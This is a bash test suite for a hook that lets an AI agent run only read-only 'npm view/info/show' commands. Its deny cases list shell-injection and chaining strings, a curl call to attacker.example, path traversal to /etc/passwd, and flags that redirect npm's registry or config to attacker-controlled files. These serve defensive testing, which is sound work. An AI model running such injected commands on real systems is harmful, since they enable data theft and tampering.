#!/bin/bash

set -euo pipefail

TEST_DIR=$(dirname "$0")
HOOK="$TEST_DIR/../allow-readonly-npm.sh"

run_hook() {
  local command=$1
  jq -nc --arg command "$command" '{tool_name:"Bash",tool_input:{command:$command}}' | bash "$HOOK"
}

assert_decision() {
  local expected=$1 command=$2
  local output decision reason
  output=$(run_hook "$command")
  decision=$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$output" 2>/dev/null || true)
  reason=$(jq -r '.hookSpecificOutput.permissionDecisionReason // empty' <<<"$output" 2>/dev/null || true)

  if [ "$decision" != "$expected" ]; then
    printf 'FAIL: expected %s for: %s\nactual: %s\n' "$expected" "$command" "$output" >&2
    exit 1
  fi
  if [ -z "$reason" ]; then
    printf 'FAIL: %s had empty reason for: %s\n' "$expected" "$command" >&2
    exit 1
  fi
}

assert_allows()         { assert_decision allow "$1"; }
assert_denies()         { assert_decision deny  "$1"; }

assert_no_decision() {
  local command=$1
  local output
  output=$(run_hook "$command")
  if [ -n "$output" ]; then
    printf 'FAIL: expected no decision for: %s\nactual: %s\n' "$command" "$output" >&2
    exit 1
  fi
}

# --- allowed shapes ---------------------------------------------------------
assert_allows 'npm view react'
assert_allows 'npm info react'
assert_allows 'npm show react'
assert_allows 'npm view @types/node'
assert_allows 'npm view react@18'
assert_allows 'npm view react@18.2.0'
assert_allows 'npm view react@latest'
assert_allows 'npm view react@^18'
assert_allows 'npm view react@~18.2'
assert_allows 'npm view react@18.0.0-rc.1'
assert_allows 'npm view @types/node@20.10.0'

# --- subcommand must be exactly one of view|info|show ----------------------
assert_denies 'npm v react'
assert_denies 'npm install react'
assert_denies 'npm i react'
assert_denies 'npm ls'
assert_denies 'npm ls react'
assert_denies 'npm search react'
assert_denies 'npm explain react'
assert_denies 'npm why react'
assert_denies 'npm outdated'
assert_denies 'npm ping'
assert_denies 'npm help install'
assert_denies 'npm --version'
assert_denies 'npm -v'
assert_denies 'npm config get registry'
assert_denies 'npm publish'
assert_denies 'npm run build'
assert_denies 'npm exec left-pad'
assert_denies 'npm uninstall react'
assert_denies 'npm docs left-pad'

# --- shape constraints: exactly one package arg, nothing else --------------
assert_denies 'npm view'
assert_denies 'npm view react version'
assert_denies 'npm view react foo bar'
assert_denies 'npm view --json react'
assert_denies 'npm view react --json'
assert_denies 'npm view  react'   # double space
assert_denies ' npm view react'   # leading space
assert_denies 'npm view react '   # trailing space

# --- package-name constraints ----------------------------------------------
assert_denies 'npm view REACT'              # uppercase name
assert_denies 'npm view @TYPES/node'        # uppercase scope
assert_denies 'npm view .hidden'            # leading dot
assert_denies 'npm view -react'             # leading dash (would look like flag)
assert_denies 'npm view ../../etc/passwd'   # path traversal shape
assert_denies 'npm view react/sub/path'     # slashes outside scope
assert_denies 'npm view @scope'             # scope with no name

# --- version-range operators that need shell quoting are rejected ----------
assert_denies 'npm view react@>=18'
assert_denies 'npm view react@>18'
assert_denies 'npm view react@<18'
assert_denies "npm view 'react@<18'"
assert_denies 'npm view "react@<18"'
assert_denies 'npm view react@=18'
assert_denies 'npm view react@*'

# --- shell injection / chaining --------------------------------------------
assert_denies 'npm view react & touch /tmp/pwned'
assert_denies 'npm view react && touch /tmp/pwned'
assert_denies 'npm view react || true'
assert_denies 'npm view react; rm -rf /tmp/x'
assert_denies 'npm view react | cat'
assert_denies 'npm view `whoami`'
assert_denies 'npm view $(whoami)'
assert_denies 'npm view <(touch /tmp/pwned)'
assert_denies 'npm view >(curl http://attacker.example/x)'
assert_denies 'npm view react > /tmp/x'
assert_denies 'npm view react >> /tmp/x'
assert_denies $'npm view react\nrm -rf /tmp/x'
assert_denies $'npm view react\trm'        # tab between args

# --- argument-injection via post-hook shell expansion ----------------------
assert_denies 'npm view *'
assert_denies 'npm view react*'
assert_denies 'npm view $PKG'
assert_denies 'npm view ${PKG}'
assert_denies 'npm view {react,vue}'

# --- npm flags that would redirect npm to attacker-controlled state --------
assert_denies 'npm view react --registry=http://attacker.example/'
assert_denies 'npm view --userconfig=/tmp/evil.npmrc react'
assert_denies 'npm view --cafile=/tmp/evil.pem react'

# --- deny reason must mention the allow-listed shapes ----------------------
deny_reason=$(run_hook 'npm install react' | jq -r '.hookSpecificOutput.permissionDecisionReason')
for needle in 'npm view <pkg>' 'npm info <pkg>' 'npm show <pkg>'; do
  if ! grep -qF -- "$needle" <<<"$deny_reason"; then
    printf 'FAIL: deny reason missing shape %q. reason:\n%s\n' "$needle" "$deny_reason" >&2
    exit 1
  fi
done

# --- non-npm runners must produce NO decision (fall through to static rules)
# The hook's `if` matcher in settings.json is glob-based and may dispatch
# `pnpm install` here; we must not deny it with an npm message.
assert_no_decision 'pnpm install'
assert_no_decision 'pnpm add react'
assert_no_decision 'pnpm run build'
assert_no_decision 'pnpm view react'
assert_no_decision 'yarn install'
assert_no_decision 'yarn add react'
assert_no_decision 'bun install'
assert_no_decision 'bun add react'
assert_no_decision 'npx create-react-app'
assert_no_decision 'npm-check'              # different binary, npm as prefix
assert_no_decision 'echo npm view react'    # npm not the first token

# --- tool-name guard: non-Bash tool calls produce no decision --------------
output=$(jq -nc '{tool_name:"Read",tool_input:{command:"npm view react"}}' | bash "$HOOK")
if [ -n "$output" ]; then
  printf 'FAIL: expected no decision for non-Bash tool, got: %s\n' "$output" >&2
  exit 1
fi

# --- empty command produces no decision ------------------------------------
output=$(jq -nc '{tool_name:"Bash",tool_input:{command:""}}' | bash "$HOOK")
if [ -n "$output" ]; then
  printf 'FAIL: expected no decision for empty command, got: %s\n' "$output" >&2
  exit 1
fi

printf 'allow-readonly-npm tests passed (%d cases)\n' \
  "$(grep -cE '^assert_(allows|denies|no_decision) ' "$0")"
